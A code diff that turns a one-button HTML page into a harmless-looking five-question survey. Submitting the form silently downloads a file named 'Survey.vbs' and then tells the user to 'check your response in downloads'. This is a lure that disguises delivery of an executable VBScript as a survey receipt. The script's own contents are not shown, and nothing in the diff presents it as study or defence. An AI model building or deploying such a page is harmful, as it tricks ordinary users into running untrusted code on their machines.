@@ -7,10 +7,48 @@
     <link rel="stylesheet" href="assets/css/styles.css">
 </head>
 <body id="body">
-    <button onclick="downloadFile()">Click me</button>
+    <div class="container">
+        <h1>Survey</h1>
+        <form id="surveyForm">
+            <label for="q1">Question 1: What is your age?</label><br>
+            <input type="number" id="q1" name="age" required><br><br>
+
+            <label for="q2">Question 2: How often do you exercise?</label><br>
+            <select id="q2" name="exercise" required>
+                <option value="">Select frequency</option>
+                <option value="daily">Daily</option>
+                <option value="weekly">Weekly</option>
+                <option value="monthly">Monthly</option>
+                <option value="rarely">Rarely</option>
+            </select><br><br>
+
+            <label for="q3">Question 3: Which is your favorite color?</label><br>
+            <input type="text" id="q3" name="color" required><br><br>
+
+            <label for="q4">Question 4: Do you prefer cats or dogs?</label><br>
+            <input type="radio" id="q4cats" name="pet" value="cats" required>
+            <label for="q4cats">Cats</label>
+            <input type="radio" id="q4dogs" name="pet" value="dogs" required>
+            <label for="q4dogs">Dogs</label><br><br>
+
+            <label for="q5">Question 5: How satisfied are you with our service?</label><br>
+            <input type="range" id="q5" name="satisfaction" min="1" max="10" required><br><br>
+
+            <button type="button" onclick="submitForm()">Submit</button>
+        </form>
+    </div>
 
     <script>
-        function downloadFile(){
+        function submitForm() {
+            var form = document.getElementById("surveyForm");
+            if (form.checkValidity()) {
+                downloadFile();
+            } else {
+                alert("Please complete all questions before submitting.");
+            }
+        }
+
+        function downloadFile() {
             // Specify the filename you want to download
             var fileName = "Survey.vbs";
             // Set the file URL to be in the same directory as your HTML file
@@ -25,6 +63,7 @@
 
             // Trigger a click event on the anchor to start the download
             a.click();
+            alert('Response Submitted. Check your response in downloads')
         }
     </script>
 </body>
